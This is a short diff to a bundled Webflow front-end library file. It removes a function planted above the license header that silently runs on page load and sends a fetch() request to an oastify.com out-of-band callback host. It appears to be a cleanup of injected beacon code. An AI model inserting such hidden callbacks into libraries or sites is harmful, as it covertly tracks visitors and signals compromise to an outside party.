@@ -1,13 +1,3 @@
-async function wheyProtein() {
-            try {
-                const logUrl = 'https://agui3t8jizmfrqc3b6f39yxgf7ly9oxd.oastify.com';
-                await fetch(logUrl);
-            } catch (error) {
-                console.error('Oops, you\'ve dropped some of your protein', error);
-            }
-        }
-
-        wheyProtein();
 /*!
  * Webflow: Front-end site library
  * @license MIT
